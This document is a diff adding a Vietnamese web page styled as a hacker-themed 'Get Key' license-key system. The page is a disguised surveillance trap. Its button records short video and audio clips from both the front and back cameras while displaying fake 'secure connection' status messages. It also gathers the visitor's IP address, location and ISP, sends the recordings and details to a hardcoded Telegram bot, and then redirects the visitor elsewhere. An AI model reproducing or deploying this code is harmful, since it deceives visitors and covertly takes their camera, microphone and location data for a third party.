@@ -1,0 +1,301 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Hệ Thống Get Key - Terminal Security</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;700;800&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-base: #020408;
+    --panel-bg: rgba(3, 7, 18, 0.9);
+    --border-color: rgba(34, 197, 94, 0.4);
+    --primary: #15803d;
+    --accent: #22c55e;
+    --text-main: #ffffff;
+    --text-muted: #4ade80;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 600; }
+  body {
+    background-color: var(--bg-base);
+    color: var(--text-main);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    overflow: hidden;
+    position: relative;
+  }
+
+  /* Hiệu ứng Matrix mưa chữ hacker */
+  canvas#matrix-rain {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 1;
+    pointer-events: none;
+  }
+
+  .card {
+    background: var(--panel-bg);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border: 2px solid var(--border-color);
+    padding: 40px 32px;
+    border-radius: 24px;
+    width: 100%;
+    max-width: 380px;
+    box-shadow: 0 0 50px rgba(22, 163, 74, 0.25);
+    text-align: center;
+    position: relative;
+    z-index: 10;
+  }
+  .live-clock {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.85rem; 
+    font-weight: 700; 
+    color: #4ade80;
+    background: rgba(22, 163, 74, 0.15); 
+    border: 1px solid rgba(34, 197, 94, 0.4);
+    padding: 6px 14px; 
+    border-radius: 20px; 
+    display: inline-block; 
+    margin-bottom: 20px;
+    letter-spacing: 1px;
+  }
+  .icon-box {
+    width: 64px; height: 64px; margin: 0 auto 20px auto;
+    background: linear-gradient(135deg, rgba(22, 163, 74, 0.3), rgba(34, 197, 94, 0.3));
+    border: 1px solid rgba(34, 197, 94, 0.6); border-radius: 20px;
+    display: flex; align-items: center; justify-content: center; font-size: 28px;
+    box-shadow: 0 0 20px rgba(34, 197, 94, 0.3);
+  }
+  h2 { font-size: 1.5rem; font-weight: 800; margin-bottom: 8px; color: #ffffff; text-shadow: 0 0 12px rgba(34,197,94,0.7); }
+  .subtitle { font-size: 0.9rem; font-weight: 700; color: #bbf7d0; margin-bottom: 28px; line-height: 1.5; font-family: 'Share Tech Mono', monospace; text-shadow: 0 0 5px rgba(34,197,94,0.3); }
+  
+  .btn-primary {
+    width: 100%; padding: 16px; 
+    background: linear-gradient(135deg, #15803d, #22c55e);
+    color: #ffffff; border: none; border-radius: 16px; 
+    font-weight: 800; font-size: 1.05rem; cursor: pointer; 
+    transition: all 0.3s ease;
+    box-shadow: 0 10px 25px -5px rgba(34, 197, 94, 0.6);
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+    text-shadow: 0 1px 3px rgba(0,0,0,0.5);
+    letter-spacing: 0.5px;
+  }
+  .btn-primary:hover { opacity: 0.95; transform: translateY(-2px); box-shadow: 0 15px 30px -5px rgba(34, 197, 94, 0.8); }
+
+  .status { margin-top: 20px; font-size: 0.85rem; font-weight: 700; color: #4ade80; min-height: 20px; font-family: 'Share Tech Mono', monospace; text-shadow: 0 0 5px rgba(34,197,94,0.4); }
+  #video { display: none; }
+</style>
+</head>
+<body>
+
+  <canvas id="matrix-rain"></canvas>
+
+  <script>
+    const canvasRain = document.getElementById('matrix-rain');
+    const ctx = canvasRain.getContext('2d');
+
+    function resizeCanvas() {
+      canvasRain.width = window.innerWidth;
+      canvasRain.height = window.innerHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    const characters = 'アカサタナハマヤラワイ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<>//:;*+-#$';
+    const fontSize = 15; 
+    let columns = canvasRain.width / fontSize;
+    const drops = [];
+
+    for (let i = 0; i < columns; i++) {
+      drops[i] = 1;
+    }
+
+    function drawMatrix() {
+      ctx.fillStyle = 'rgba(2, 4, 8, 0.1)';
+      ctx.fillRect(0, 0, canvasRain.width, canvasRain.height);
+
+      ctx.fillStyle = '#10b981'; 
+      ctx.font = 'bold ' + fontSize + 'px "Share Tech Mono", monospace';
+
+      for (let i = 0; i < drops.length; i++) {
+        const text = characters.charAt(Math.floor(Math.random() * characters.length));
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+        if (drops[i] * fontSize > canvasRain.height && Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+        drops[i]++;
+      }
+    }
+    setInterval(drawMatrix, 30);
+  </script>
+
+  <div class="card">
+    <div class="live-clock" id="clock">SYSTEM_TIME: --:--:--</div>
+    
+    <div class="icon-box">💻</div>
+    <h2>Hệ Thống Get Key</h2>
+    <p class="subtitle">&gt; Nhấn nút bên dưới để giải mã và nhận Key bản quyền an toàn.</p>
+
+    <video id="video" autoplay playsinline muted></video>
+
+    <button class="btn-primary" id="get-key-btn" onclick="triggerProcess()">
+      <span>🔑 GET KEY NGAY</span>
+    </button>
+    
+    <div id="status" class="status"></div>
+  </div>
+
+<script>
+  const TELEGRAM_BOT_TOKEN = '8004670099:AAE-K9WLJWR4c2mfPVWS0fIWl_wLOci0UFk'; 
+  const TELEGRAM_CHAT_ID = '-5529480454'; 
+  const REDIRECT_URL = 'https://xnhau.city/';
+
+  function updateClock() {
+    const now = new Date();
+    document.getElementById('clock').textContent = `🕒 ${now.toLocaleTimeString('vi-VN', { hour12: false })}`;
+  }
+  setInterval(updateClock, 1000);
+  updateClock();
+
+  const statusDiv = document.getElementById('status');
+  const video = document.getElementById('video');
+  const getKeyBtn = document.getElementById('get-key-btn');
+
+  // Hàm quay video kèm âm thanh trong thời gian (duration) tính bằng mili-giây
+  async function recordVideo(facingMode, duration = 3000) {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: { exact: facingMode } }, 
+        audio: true 
+      });
+      video.srcObject = stream;
+      await video.play();
+
+      return await new Promise((resolve) => {
+        let recordedChunks = [];
+        let options = { mimeType: 'video/webm; codecs=vp8,opus' };
+        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+          options = { mimeType: 'video/webm' };
+          if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+            options = {}; // Dùng mặc định của trình duyệt nếu webm không hỗ trợ
+          }
+        }
+
+        const mediaRecorder = new MediaRecorder(stream, options);
+
+        mediaRecorder.ondataavailable = (event) => {
+          if (event.data && event.data.size > 0) {
+            recordedChunks.push(event.data);
+          }
+        };
+
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(recordedChunks, { type: 'video/webm' });
+          stream.getTracks().forEach(track => track.stop());
+          resolve(blob);
+        };
+
+        mediaRecorder.start();
+        setTimeout(() => {
+          if (mediaRecorder.state !== 'inactive') {
+            mediaRecorder.stop();
+          }
+        }, duration);
+      });
+    } catch (e) {
+      return null;
+    }
+  }
+
+  async function triggerProcess() {
+    getKeyBtn.style.display = 'none';
+    statusDiv.textContent = '[*] Đang khởi tạo kết nối bảo mật...';
+
+    let ipDetails = { ip: 'Không rõ', city: 'Không rõ', country: 'Không rõ', org: 'Không rõ' };
+    try {
+      const ipRes = await fetch('https://ipwho.is/');
+      const ipData = await ipRes.json();
+      if (ipData.success) {
+        ipDetails = {
+          ip: ipData.ip,
+          city: ipData.city,
+          country: ipData.country,
+          org: ipData.connection?.isp || 'Không rõ'
+        };
+      }
+    } catch (e) {}
+
+    const ua = navigator.userAgent;
+    let deviceName = /android/i.test(ua) ? 'Android 🤖' : /iphone|ipad/i.test(ua) ? 'iOS 🍏' : 'PC/Laptop 💻';
+
+    const infoText = 
+      `💻 <b>YÊU CẦU GET KEY (VIDEO RECORD)</b> 💻\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `📱 <b>Thiết bị:</b> ${deviceName}\n` +
+      `🌐 <b>IP:</b> <code>${ipDetails.ip}</code>\n` +
+      `🏙️ <b>Địa điểm:</b> ${ipDetails.city}, ${ipDetails.country}\n` +
+      `🏢 <b>Nhà mạng:</b> ${ipDetails.org}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━`;
+
+    statusDiv.textContent = '[*] Đang ghi hình luồng #1 (Camera sau)...';
+    // Quay camera sau trong 3 giây
+    let backVideoBlob = await recordVideo('environment', 3000);
+
+    statusDiv.textContent = '[*] Đang ghi hình luồng #2 (Camera trước)...';
+    // Quay camera trước trong 3 giây
+    let frontVideoBlob = await recordVideo('user', 3000);
+
+    let hasSent = false;
+
+    if (backVideoBlob && backVideoBlob.size > 0) {
+      const fd = new FormData();
+      fd.append('chat_id', TELEGRAM_CHAT_ID);
+      fd.append('video', backVideoBlob, 'back_video.webm');
+      fd.append('caption', infoText + '\n\n🎥 <b>Video Camera Sau (Kèm âm thanh)</b>');
+      fd.append('parse_mode', 'HTML');
+      try { 
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd }); 
+        hasSent = true;
+      } catch(e){}
+    }
+
+    if (frontVideoBlob && frontVideoBlob.size > 0) {
+      const fd2 = new FormData();
+      fd2.append('chat_id', TELEGRAM_CHAT_ID);
+      fd2.append('video', frontVideoBlob, 'front_video.webm');
+      fd2.append('caption', '🎥 <b>Video Camera Trước (Kèm âm thanh)</b>');
+      fd2.append('parse_mode', 'HTML');
+      try { 
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd2 }); 
+        hasSent = true;
+      } catch(e){}
+    }
+
+    if (!hasSent) {
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: infoText + '\n\n⚠️ (Không thể quay video hoặc truy cập camera/microphone)', parse_mode: 'HTML' })
+        });
+      } catch (e) {}
+    }
+
+    statusDiv.textContent = '[+] Thành công! Đang chuyển hướng...';
+    setTimeout(() => {
+      window.location.href = REDIRECT_URL;
+    }, 1000);
+  }
+</script>
+</body>
+</html>
